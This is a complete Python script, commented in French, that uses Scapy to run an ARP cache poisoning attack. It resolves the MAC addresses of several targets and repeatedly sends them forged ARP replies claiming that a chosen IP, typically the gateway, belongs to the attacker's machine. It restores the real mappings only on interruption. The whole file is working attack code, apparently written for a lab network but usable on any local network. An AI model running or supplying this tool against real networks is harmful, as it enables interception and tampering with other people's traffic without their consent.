#!/usr/bin/env python3
# Usage: python3 arp_spoof.py <target_ip1,target_ip2,...> <spoof_ip> <iface>
# Exemple: python3 arp_spoof.py 10.0.2.10,10.0.2.11 10.0.2.1 att-eth0

import sys
import time
import socket
from scapy.all import ARP, Ether, sendp, srp, conf

def resolve_name(name):
    """Résout un nom d'hôte en IP si possible, sinon retourne None."""
    try:
        return socket.gethostbyname(name)
    except socket.gaierror:
        return None

def get_mac(ip, iface=None, timeout=2):
    """Résout la MAC d'une IP par ARP request."""
    if not ip:
        return None
    conf.iface = iface or conf.iface
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=timeout, verbose=False)
    for _, r in ans:
        return r[Ether].src
    return None

def spoof(target_ip, target_mac, spoof_ip, attacker_mac, iface):
    """
    Envoie un ARP reply encapsulé dans une trame Ethernet (L2) vers target_mac.
    Ceci évite les warnings et garantit l'utilisation correcte de l'interface.
    """
    arp_reply = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    ether = Ether(dst=target_mac, src=attacker_mac)
    sendp(ether/arp_reply, iface=iface, verbose=False)

def restore(target_ip, target_mac, real_ip, real_mac, iface):
    """
    Restaure la table ARP du target en envoyant plusieurs paquets ARP is-at vrais.
    """
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    ether = Ether(dst=target_mac, src=real_mac)
    sendp(ether/arp, iface=iface, count=5, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 arp_spoof.py <targets_comma> <spoof_ip> <iface>")
        sys.exit(1)

    targets_raw = sys.argv[1].split(",")
    spoof_raw = sys.argv[2]
    iface = sys.argv[3]

    # Résolution des noms en IP si nécessaire
    targets = []
    for t in targets_raw:
        ip = resolve_name(t)
        if ip:
            targets.append((t, ip))  # on conserve aussi le nom original pour l'affichage
        else:
            # si t ressemble déjà à une IP (format simple) on l'accepte
            # tentative basique : si contient des chiffres et des points, on l'utilise directement
            if all(part.isdigit() and 0 <= int(part) < 256 for part in t.split(".") if part):
                targets.append((t, t))
            else:
                print(f"[!] Impossible de résoudre le nom '{t}' en IP.")
                sys.exit(1)

    spoof_ip = resolve_name(spoof_raw) or spoof_raw
    if not spoof_ip:
        print(f"[!] Impossible de résoudre la spoof IP/nom '{spoof_raw}'.")
        sys.exit(1)

    # Obtenir MAC attaquant et MAC cible(s)
    conf.iface = iface  # définir l'interface Scapy
    try:
        import netifaces
        attacker_mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
    except Exception as e:
        print("[!] Impossible d'obtenir l'adresse MAC de l'interface:", e)
        sys.exit(1)

    print("[*] Interface:", iface, "Attacker MAC:", attacker_mac)
    target_macs = {}
    for t_name, t_ip in targets:
        mac = get_mac(t_ip, iface=iface)
        if mac:
            target_macs[t_ip] = mac
            print("[*] Résolu", t_name, "->", mac)
        else:
            print("[!] Impossible de résoudre la MAC pour", t_name, "(IP:", t_ip, ")")
            sys.exit(1)

    print("[*] Démarrage de l'empoisonnement ARP. CTRL+C pour stopper.")
    try:
        while True:
            for t_ip, t_mac in target_macs.items():
                # dire au target que spoof_ip est à l'attaquant
                spoof(t_ip, t_mac, spoof_ip, attacker_mac, iface)
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n[*] Restauration des tables ARP...")
        # Si spoof_ip est la gateway, on restaure en envoyant la vraie info.
        # On essaye d'obtenir la vraie MAC de spoof_ip (elle est normalement sur le sous-réseau)
        real_mac = get_mac(spoof_ip, iface=iface)
        if real_mac:
            for t_ip, t_mac in target_macs.items():
                restore(t_ip, t_mac, spoof_ip, real_mac, iface)
        print("[*] Terminé.")
